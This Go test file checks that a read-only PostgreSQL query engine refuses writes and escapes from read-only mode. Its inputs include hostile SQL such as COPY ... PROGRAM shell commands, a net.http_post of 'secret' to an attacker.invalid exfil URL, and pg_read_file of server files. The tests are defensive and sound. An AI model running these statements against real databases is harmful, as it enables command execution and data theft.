package engine_test

import (
	"testing"

	"github.com/jackc/pgx/v5"

	"github.com/jpgomesf/pgglass/internal/config"
	"github.com/jpgomesf/pgglass/internal/engine"
	"github.com/jpgomesf/pgglass/internal/testdb"
)

const writesFixture = `
CREATE TABLE t (id int PRIMARY KEY, v text NOT NULL);
INSERT INTO t VALUES (1, 'one'), (2, 'two');
CREATE TABLE src (id int, v text);
INSERT INTO src VALUES (2, 'merged'), (3, 'three');
CREATE SEQUENCE s;
CREATE PROCEDURE add_row(i int) LANGUAGE sql AS $$ INSERT INTO t VALUES (i, 'proc') $$;
`

const stateSQL = `SELECT format('t=%s seq=%s temp_tables=%s',
	(SELECT string_agg(id || ':' || v, ',' ORDER BY id) FROM t),
	(SELECT last_value || '/' || is_called FROM s),
	(SELECT count(*) FROM pg_class WHERE relpersistence = 't'))`

func superuserScratch(t *testing.T, name string) (*engine.Manager, *pgx.Conn) {
	t.Helper()
	testdb.CreateDatabase(t, name, writesFixture)
	return newManager(t, config.Defaults{}, oneConn(testdb.DSN(t, testdb.Superuser, name))), testdb.Conn(t, testdb.Superuser, name)
}

func TestWritesAreRefused(t *testing.T) {
	t.Parallel()
	m, watch := superuserScratch(t, "engine_writes")
	for _, tc := range []struct{ name, sql, state string }{
		{"data-modifying CTE", "WITH gone AS (DELETE FROM t RETURNING *) SELECT count(*) FROM gone", "25006"},
		{"MERGE", "MERGE INTO t USING src ON t.id = src.id WHEN MATCHED THEN UPDATE SET v = src.v " +
			"WHEN NOT MATCHED THEN INSERT VALUES (src.id, src.v)", "25006"},
		{"CALL of a writing procedure", "CALL add_row(9)", "25006"},
		{"nextval", "SELECT nextval('s')", "25006"},
		{"CREATE TEMP TABLE", "CREATE TEMP TABLE scratch (id int)", "25006"},
		{"COPY FROM", "COPY t FROM PROGRAM 'touch /tmp/engine_copy_from_ran; echo 9,nine' WITH (FORMAT csv)", "25006"},
		{"COMMIT then DROP TABLE", "COMMIT; DROP TABLE t", "42601"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			before := testdb.Value[string](t, watch, stateSQL)
			_, err := m.Query(t.Context(), db, engine.Query{SQL: tc.sql})
			wantSQLState(t, err, tc.state)
			if after := testdb.Value[string](t, watch, stateSQL); after != before {
				t.Errorf("state changed from %s to %s", before, after)
			}
		})
	}
	if ran := testdb.Value[string](t, watch, "SELECT (pg_stat_file('/tmp/engine_copy_from_ran', true) IS NOT NULL)::text"); ran != "false" {
		t.Error("COPY FROM PROGRAM started its program")
	}
}

func TestPgNetRequestIsRefused(t *testing.T) {
	t.Parallel()
	m := newManager(t, config.Defaults{}, testdb.DSN(t, testdb.Superuser, testdb.DBSupabase))
	watch := testdb.Conn(t, testdb.Superuser, testdb.DBSupabase)

	const queued = "SELECT count(*)::text FROM net.http_request_queue"
	before := testdb.Value[string](t, watch, queued)
	_, err := m.Query(t.Context(), db, engine.Query{SQL: "SELECT net.http_post('https://attacker.invalid/exfil', 'secret')"})
	wantSQLState(t, err, "25006")
	if after := testdb.Value[string](t, watch, queued); after != before {
		t.Errorf("queued requests went from %s to %s", before, after)
	}
}

// No query can loosen the read-only mode of the queries after it, which run
// in the same session.
func TestReadOnlyCannotBeTurnedOff(t *testing.T) {
	t.Parallel()
	m, watch := superuserScratch(t, "engine_escape")
	session := value(t, m, "SELECT pg_backend_pid()")

	for _, tc := range []struct {
		name, sql string
		state     string
	}{
		{"SET default_transaction_read_only", "SET default_transaction_read_only = off", ""},
		{"SET SESSION CHARACTERISTICS", "SET SESSION CHARACTERISTICS AS TRANSACTION READ WRITE", ""},
		{"SET TRANSACTION READ WRITE", "SET TRANSACTION READ WRITE", "25001"},
		{"set_config of transaction_read_only", "SELECT set_config('transaction_read_only', 'off', false)", "25001"},
		{"COMMIT", "COMMIT", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := m.Query(t.Context(), db, engine.Query{SQL: tc.sql})
			if tc.state != "" {
				wantSQLState(t, err, tc.state)
			} else if err != nil {
				t.Errorf("%s: %v", tc.sql, err)
			}

			before := testdb.Value[string](t, watch, stateSQL)
			_, err = m.Query(t.Context(), db, engine.Query{SQL: "INSERT INTO t VALUES (100, 'after')"})
			wantSQLState(t, err, "25006")
			if after := testdb.Value[string](t, watch, stateSQL); after != before {
				t.Errorf("state changed from %s to %s", before, after)
			}

			const next = "SELECT pg_backend_pid() || ' ' || current_setting('default_transaction_read_only')"
			if got := value(t, m, next); got != session+" on" {
				t.Errorf("next query: backend and default_transaction_read_only = %s, want %s on", got, session)
			}
		})
	}
}

// These act outside the transaction, so READ ONLY cannot stop them: the guard
// rejects them, and these tests keep visible what the engine alone allows.
func TestGapsOwnedByTheGuard(t *testing.T) {
	t.Parallel()
	testdb.CreateDatabase(t, "engine_gaps", "CREATE EXTENSION dblink; CREATE TABLE t (id int PRIMARY KEY, v text NOT NULL);")
	m := newManager(t, config.Defaults{}, testdb.DSN(t, testdb.Superuser, "engine_gaps"))
	watch := testdb.Conn(t, testdb.Superuser, "engine_gaps")

	t.Run("dblink_exec writes through another session", func(t *testing.T) {
		got := value(t, m, "SELECT dblink_exec('dbname=engine_gaps', 'INSERT INTO t VALUES (1, ''via dblink'')')")
		if got != "INSERT 0 1" {
			t.Errorf("dblink_exec = %s", got)
		}
		if v := testdb.Value[string](t, watch, "SELECT v FROM t WHERE id = 1"); v != "via dblink" {
			t.Errorf("row written through dblink = %q", v)
		}
	})
	t.Run("COPY TO PROGRAM runs a shell command", func(t *testing.T) {
		mustQuery(t, m, engine.Query{SQL: "COPY (SELECT 'ran') TO PROGRAM 'cat > /tmp/engine_copy_to_program'"})
		if out := testdb.Value[string](t, watch, "SELECT pg_read_file('/tmp/engine_copy_to_program')"); out != "ran\n" {
			t.Errorf("program output = %q", out)
		}
	})
	t.Run("pg_read_file reads server files", func(t *testing.T) {
		if v := value(t, m, "SELECT pg_read_file('PG_VERSION')"); v == "" || v == "NULL" {
			t.Errorf("PG_VERSION = %q", v)
		}
	})
}
